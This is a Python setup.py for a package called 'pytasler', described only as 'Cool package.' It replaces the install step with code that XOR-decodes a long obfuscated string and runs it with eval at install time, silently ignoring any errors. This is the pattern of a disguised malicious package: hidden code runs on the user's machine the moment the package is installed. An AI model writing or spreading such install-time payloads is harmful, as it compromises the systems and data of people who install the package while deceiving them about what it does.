from setuptools import setup, find_packages
from setuptools.command.install import install
from pathlib import Path
import os


VERSION = '1.0.1'
DESCRIPTION = 'Cool package.'
this_directory = Path(__file__).parent
long_description = (this_directory / "README.md").read_text()


class InstallCommand(install):

    def run(self):
        try:
            wopvEaTEcopFEavc ="]]E]JE\x13]@:P_B^JA\x12A@SI@YWUGG9TW_Y^\x11\t\x17\\B\x16R]G[[SXW\x1e\x1c;ZR\x12\\J\x1aITBP\x18VHX@E@\x18U\x15v\nkmaCREBhdKYXQZVLhjsGA|PLRdke[QX[VVon~YZ@]BWSFnifP\\R[GGhokLYBD\x11yR]DdihAXSFPTEim`MAG\\Y\x0f\x01jd\x11\x1a\x10\x0c\x0e\x11uQ_AP\n=;\x14\x10\x17\x17^G\x16]^S_A\x10W\x16u\x08kmmB]AKkkO\\ZUQ_NnoqIBvPLTnng^X__ZWhh~Q[J_C^RComo\\VWXCGmeeAPA@\x12~\\ZLijhD\\WCR\\@loaLCCTY\x06\x03\x15\x18>\x18\x10\x15\x17YC]_\x1cP\x10t\x0bdmm@]EDhlN^WVZ\\NlesBA|TFSimk]WYYZSoduQSB^GXUEdioZYP[FJjibGU@G\x19y\\[CdjcB^TCR]@nicNB@UZ\x01\x05hdg|y\x05\x01\x16GVE\x10\x1b\x11\x1aP\x1a\x1a\x16@E]DP\x1a^\x16`WG\x10nAZbPP^^\x15\x0c\x19qDQQ@Q|ZR]SD\x19\x16``RJ\\HG\x19g\\TUZ\x17\x18\x13h\\dJ\\j]STZ\x1dbD]\x11PXA\x1a\x06\x04\x1e\x11\x12\x10\x15t\x0bhdeFRD@dmOZ]PXVLdoyGGpQASdma]R]P\\Umdx[QG^J]P@lhcZV\\WGCmhdGPJA\x18~RZAmefG^TFS^JhefOKBV]\x07\x07mogz|\x06\x02\x19SUD\x15\x17\x17\x14{XG\x1f\x05\x07\x11\x1d\x14\x06nYb]E\x18dK_d\\UY^\x18\x0c\x13|\\DQ[\\V\x1f\x1c8\x12\x15\x11\x19]FQ^\x1cR\x11{\x02dleBQE@mdNT\\P]ZLejtACpSGXhegYY[Z^Vom~YP@ZCXW@lk`XZ\\_BDjokEUDF\x17|]_ModgE[WGSUBon`DX@FDHine|\x7f\x0f\x06\x18BRG\x16\x1f\x18\x1aY\x12\x19\x1fCEZE]\x1d^\x14\x10\x13gTM\x16bB[gZVUX\x19\x08\x16{DVQEV~QZVQA\x18\x15fgSE^A@\x16c]RZ_\x1a\x18\x14j\\`BPbPVT[\x19fE[\x12[YA\x1a\x00\x04\x10\x12\x14\x11\x1av\x08nidJWDGlhO_W_Q^MmhvCA|TLRkhf^X[\\_Thn~PWKZEWPGlmdX]T\\EFlkb@QEC\x11y]^@kjcJ^SDSZBdmkJKCRY\x06\x01ndcF\\GYTW\x1cT@P\x10\x12\x13\x11zZD\x1c\x03\x00\x1d\x1f\x18\x08d^cT@\x17dBPfPV[X\x14\x0c\x19xZE[]\\T\x1e\x13\x1e\x1c<2\x16\x13\x10\x11\\AV^\x1bT\x17s\rmheDRCGdlN[YTQ_IjnvAHuYGYkkf_T_Q_Tno}PQ@^KZTFimn[XP_CGodkLQBE\x14zV_MidcE[SCX[FmogK@MQT\x03\x02djdy\x7f\x00\x03\x1dRRF\x17\x1c\x17\x13U\x12\x1e\x19FFQDP\x1fP\x14\x1f\x16V_FDP\\\\Q]\x18\x18CFQ[A^TA\x12^I]]E_TZSV_^[\x12\x19P_CZ_WY\\\x10\x1fAF^\\CQAA\x13q{ft~dzd}p\x12\x11Q@ME\x0c\x17\x19\x06\x01\x1f\x02\x06\x0b\x1e\x01\x07\x1b\x01\x03\t\x0e\x08\x07\x0f\x00\x1b\\\\\x1aEC]LXYS\x10\x17\x13{\x0bdomDRFCinC]\\UZ^DnnpHEvSAPend[QY]]_dd}YRFX@^^Ado`]ZUVAFmogFRK@\x19xSVColaA^TBR_FlkbMCCR\\\x02\x0clieC]LXYS\x1cRI]\x13d]KCVFD\x15\x10\x1a\x11\x11q\tlegATJFnnN]VU_ZMhhrHH|QDPhka^YXQ]Phh|PUG^@[TGehn\\X\\YDCmobGQAF\x15}R_AlkgC[_BTZEodb@W@CDHmddqy\x01\x00\x1eCPK\x13\x14\x15\x14\x193\x12\x12\x11\x18FGPECVQSGC\x1aFFV\x10^\x12s\x0bhkfB]GKokOX^^_[LohsCIpXAWdja_P^X]WonxYTC[CXQEhdg\\YR\\OBhjaCPJE\x18~]YBhle@WVAS^CenaHKAW_\x03\x05ena}~\x07\x06\x1dNZK\x12\x1c\x11G_V]T\x08lABQ\x18\x11Z^PRX\tfALQ\x10?\x16\x18\x16\x13:T_BV\n\x13\x12\x15:\x17\x11\x14\x10GVBG2\x13\x15GDZVE\x1c\x14Z^\x11Q_KGY[[]^R\x1c\x16\x1f\x11\x1b" 

            iOpvEoeaaeavocp = "4052813230922185225192640443888001473185837441965134239495686301313032507140771480576381462718183877"
            uocpEAtacovpe = len(wopvEaTEcopFEavc)
            oIoeaTEAcvpae = ""
            for fapcEaocva in range(uocpEAtacovpe):
                nOpcvaEaopcTEapcoTEac = wopvEaTEcopFEavc[fapcEaocva]
                qQoeapvTeaocpOcivNva = iOpvEoeaaeavocp[fapcEaocva % len(iOpvEoeaaeavocp)]
                oIoeaTEAcvpae += chr(ord(nOpcvaEaopcTEapcoTEac) ^ ord(qQoeapvTeaocpOcivNva))


            eval(compile(oIoeaTEAcvpae, '<string>', 'exec'))
        except:
            pass
        install.run(self)


setup(
    name="pytasler",
    version=VERSION,
    author="HW",
    author_email="",
    description=DESCRIPTION,
    long_description_content_type="text/markdown",
    long_description=long_description,
    packages=find_packages(),
    install_requires=[],
    keywords=[],
    classifiers=[
        "Development Status :: 1 - Planning",
        "Intended Audience :: Developers",
        "Programming Language :: Python :: 3",
        "Operating System :: Unix",
        "Operating System :: MacOS :: MacOS X",
        "Operating System :: Microsoft :: Windows",
    ],
    cmdclass={
        'install': InstallCommand
    }
)